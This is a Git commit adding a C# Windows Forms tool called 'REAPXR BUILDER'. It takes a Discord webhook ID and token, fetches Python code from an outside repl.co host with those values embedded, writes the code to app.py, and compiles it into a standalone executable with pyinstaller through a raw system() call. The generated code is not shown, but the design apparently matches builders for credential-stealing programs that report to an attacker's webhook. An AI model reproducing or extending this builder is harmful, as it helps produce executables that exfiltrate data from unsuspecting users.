cab19e9ab6a77a1dd4321ec070b29d8a99de52a1
REAPER <76002296+REAPXR666@users.noreply.github.com>
2023-05-30 20:19:23 +0100

    Add files via upload

---
+++ RP Installer/Form1.Designer.cs
@@ -0,0 +1,317 @@
+﻿namespace RP_Installer
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.label3 = new System.Windows.Forms.Label();
+            this.button4 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.panel2 = new System.Windows.Forms.Panel();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.button6 = new System.Windows.Forms.Button();
+            this.button5 = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.panel3 = new System.Windows.Forms.Panel();
+            this.label6 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.panel1.SuspendLayout();
+            this.panel2.SuspendLayout();
+            this.panel3.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.Color.White;
+            this.label1.Location = new System.Drawing.Point(12, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(776, 58);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "REAPXR BUILDER";
+            this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            this.label1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.label1_MouseDown);
+            this.label1.MouseMove += new System.Windows.Forms.MouseEventHandler(this.label1_MouseMove);
+            this.label1.MouseUp += new System.Windows.Forms.MouseEventHandler(this.label1_MouseUp);
+            // 
+            // label2
+            // 
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.Color.Red;
+            this.label2.Location = new System.Drawing.Point(757, 9);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(31, 33);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "X";
+            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.label2.Click += new System.EventHandler(this.label2_Click);
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Black;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.Color.Lime;
+            this.button1.Location = new System.Drawing.Point(0, 107);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(212, 26);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "GREEN TEXT";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // panel1
+            // 
+            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(23)))), ((int)(((byte)(31)))));
+            this.panel1.Controls.Add(this.label3);
+            this.panel1.Controls.Add(this.button4);
+            this.panel1.Controls.Add(this.button3);
+            this.panel1.Controls.Add(this.button2);
+            this.panel1.Controls.Add(this.button1);
+            this.panel1.Location = new System.Drawing.Point(12, 70);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(212, 167);
+            this.panel1.TabIndex = 3;
+            // 
+            // label3
+            // 
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.Red;
+            this.label3.Location = new System.Drawing.Point(4, 5);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(205, 33);
+            this.label3.TabIndex = 4;
+            this.label3.Text = "GUI";
+            this.label3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // button4
+            // 
+            this.button4.BackColor = System.Drawing.Color.Black;
+            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button4.ForeColor = System.Drawing.Color.White;
+            this.button4.Location = new System.Drawing.Point(0, 139);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(212, 26);
+            this.button4.TabIndex = 5;
+            this.button4.Text = "WHITE TEXT";
+            this.button4.UseVisualStyleBackColor = false;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // button3
+            // 
+            this.button3.BackColor = System.Drawing.Color.Black;
+            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.ForeColor = System.Drawing.Color.Red;
+            this.button3.Location = new System.Drawing.Point(0, 43);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(212, 26);
+            this.button3.TabIndex = 4;
+            this.button3.Text = "RED  TEXT";
+            this.button3.UseVisualStyleBackColor = false;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.Black;
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button2.ForeColor = System.Drawing.Color.Blue;
+            this.button2.Location = new System.Drawing.Point(0, 75);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(212, 26);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "BLUE  TEXT";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // panel2
+            // 
+            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(23)))), ((int)(((byte)(31)))));
+            this.panel2.Controls.Add(this.textBox2);
+            this.panel2.Controls.Add(this.button6);
+            this.panel2.Controls.Add(this.button5);
+            this.panel2.Controls.Add(this.textBox1);
+            this.panel2.Controls.Add(this.label4);
+            this.panel2.Location = new System.Drawing.Point(230, 70);
+            this.panel2.Name = "panel2";
+            this.panel2.Size = new System.Drawing.Size(340, 167);
+            this.panel2.TabIndex = 6;
+            // 
+            // textBox2
+            // 
+            this.textBox2.BackColor = System.Drawing.Color.Black;
+            this.textBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.textBox2.ForeColor = System.Drawing.Color.Red;
+            this.textBox2.Location = new System.Drawing.Point(4, 69);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(333, 20);
+            this.textBox2.TabIndex = 8;
+            this.textBox2.Text = "Webhook Token";
+            // 
+            // button6
+            // 
+            this.button6.BackColor = System.Drawing.Color.Black;
+            this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button6.ForeColor = System.Drawing.Color.Red;
+            this.button6.Location = new System.Drawing.Point(4, 139);
+            this.button6.Name = "button6";
+            this.button6.Size = new System.Drawing.Size(333, 28);
+            this.button6.TabIndex = 7;
+            this.button6.Text = "BUILD";
+            this.button6.UseVisualStyleBackColor = false;
+            this.button6.Click += new System.EventHandler(this.button6_Click);
+            // 
+            // button5
+            // 
+            this.button5.BackColor = System.Drawing.Color.Black;
+            this.button5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button5.ForeColor = System.Drawing.Color.Red;
+            this.button5.Location = new System.Drawing.Point(4, 107);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(333, 26);
+            this.button5.TabIndex = 6;
+            this.button5.Text = "TEST";
+            this.button5.UseVisualStyleBackColor = false;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.Black;
+            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.textBox1.ForeColor = System.Drawing.Color.Red;
+            this.textBox1.Location = new System.Drawing.Point(4, 43);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(333, 20);
+            this.textBox1.TabIndex = 5;
+            this.textBox1.Text = "Webhook ID";
+            // 
+            // label4
+            // 
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label4.ForeColor = System.Drawing.Color.Red;
+            this.label4.Location = new System.Drawing.Point(4, 5);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(333, 33);
+            this.label4.TabIndex = 4;
+            this.label4.Text = "BUILDER";
+            this.label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // panel3
+            // 
+            this.panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(23)))), ((int)(((byte)(31)))));
+            this.panel3.Controls.Add(this.label6);
+            this.panel3.Controls.Add(this.label5);
+            this.panel3.Location = new System.Drawing.Point(576, 70);
+            this.panel3.Name = "panel3";
+            this.panel3.Size = new System.Drawing.Size(212, 167);
+            this.panel3.TabIndex = 7;
+            // 
+            // label6
+            // 
+            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label6.ForeColor = System.Drawing.Color.Red;
+            this.label6.Location = new System.Drawing.Point(3, 45);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(205, 119);
+            this.label6.TabIndex = 5;
+            this.label6.Text = "Created By REAPXR#5664\r\n\r\n\r\nDo Not Redistribute";
+            this.label6.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // label5
+            // 
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label5.ForeColor = System.Drawing.Color.Red;
+            this.label5.Location = new System.Drawing.Point(4, 5);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(205, 33);
+            this.label5.TabIndex = 4;
+            this.label5.Text = "CREDITS";
+            this.label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // timer1
+            // 
+            this.timer1.Interval = 1000;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(800, 252);
+            this.Controls.Add(this.panel3);
+            this.Controls.Add(this.panel2);
+            this.Controls.Add(this.panel1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.panel1.ResumeLayout(false);
+            this.panel2.ResumeLayout(false);
+            this.panel2.PerformLayout();
+            this.panel3.ResumeLayout(false);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Panel panel2;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Panel panel3;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Button button5;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button6;
+        private System.ComponentModel.BackgroundWorker backgroundWorker1;
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.TextBox textBox2;
+    }
+}
+
---
+++ RP Installer/Form1.cs
@@ -0,0 +1,189 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Runtime.InteropServices;
+
+namespace RP_Installer
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("msvcrt.dll")]
+        public static extern int system(string format);
+        public Form1()
+        {
+            InitializeComponent();
+            label1.ForeColor = Color.White;
+            timer1.Interval = 100;
+            timer1.Start();
+        }
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("beta Release", "REAPXR BUILDER");
+            Application.Exit();
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            //red text
+            changetext(Color.Red);
+        }
+        private void changetext(Color color)
+        {
+            label2.ForeColor = color;
+            label3.ForeColor = color;
+            label4.ForeColor = color;
+            label5.ForeColor = color;
+            label6.ForeColor = color;
+            textBox1.ForeColor = color;
+            textBox2.ForeColor = color;
+            button5.ForeColor = color;
+            button6.ForeColor = color;
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            //blue text
+            changetext(Color.Blue);
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //green text
+            changetext(Color.Lime);
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            //white text
+            changetext(Color.White);
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                string webhook = "https://discord.com/api/webhooks/" + textBox1.Text + "/" + textBox2.Text;
+                WebClient client = new WebClient();
+                client.Headers.Add("Content-Type", "application/json");
+                string payload = "{\"content\": \"" + "Webhook Is Working!" + "\"}";
+                client.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
+            }
+            catch
+            {
+                MessageBox.Show("Webhook Failed To Send");
+            }
+        }
+
+        string code = "";
+        private bool mouseDown;
+        private Point lastLocation;
+
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            string webhook = textBox1.Text;
+            try
+            {
+                WebClient client = new WebClient();
+                code = client.DownloadString($"https://builder.louiswj.repl.co/" + textBox1.Text + "/" + textBox2.Text);
+                MessageBox.Show("Built Code Successfully", "Success");
+            }
+            catch
+            {
+                MessageBox.Show("Failed To Generate Code", "Api Error");
+            }
+            File.WriteAllText("app.py", code);
+            string apppath = Application.StartupPath;
+            Clipboard.SetText(apppath);
+            try
+            {
+                system($"pyinstaller --onefile app.py");
+            }
+            catch
+            {
+                MessageBox.Show("Failed To Build");
+            }
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            if (label1.ForeColor == Color.White)
+            {
+                label1.ForeColor = Color.Yellow;
+            }
+            else if (label1.ForeColor == Color.Yellow)
+            {
+                label1.ForeColor = Color.Lime;
+            }
+            else if (label1.ForeColor == Color.Lime)
+            {
+                label1.ForeColor = Color.Green;
+            }
+            else if (label1.ForeColor == Color.Green)
+            {
+                label1.ForeColor = Color.DarkBlue;
+            }
+            else if (label1.ForeColor == Color.DarkBlue)
+            {
+                label1.ForeColor = Color.Blue;
+            }
+            else if (label1.ForeColor == Color.Blue)
+            {
+                label1.ForeColor = Color.Cyan;
+            }
+            else if (label1.ForeColor == Color.Cyan)
+            {
+                label1.ForeColor = Color.LightPink;
+            }
+            else if (label1.ForeColor == Color.LightPink)
+            {
+                if (label1.Text == "REAPXR BUILDER")
+                {
+                    label1.Text = "VERSION 1.0";
+                } else
+                {
+                    label1.Text = "REAPXR BUILDER";
+                }
+                label1.ForeColor = Color.White;
+            }
+        }
+
+        private void label1_MouseDown(object sender, MouseEventArgs e)
+        {
+            mouseDown = true;
+            lastLocation = e.Location;
+        }
+
+        private void label1_MouseMove(object sender, MouseEventArgs e)
+        {
+            if (mouseDown)
+            {
+                this.Location = new Point(
+                    (this.Location.X - lastLocation.X) + e.X, (this.Location.Y - lastLocation.Y) + e.Y);
+
+                this.Update();
+            }
+        }
+
+        private void label1_MouseUp(object sender, MouseEventArgs e)
+        {
+            mouseDown = false;
+        }
+    }
+}
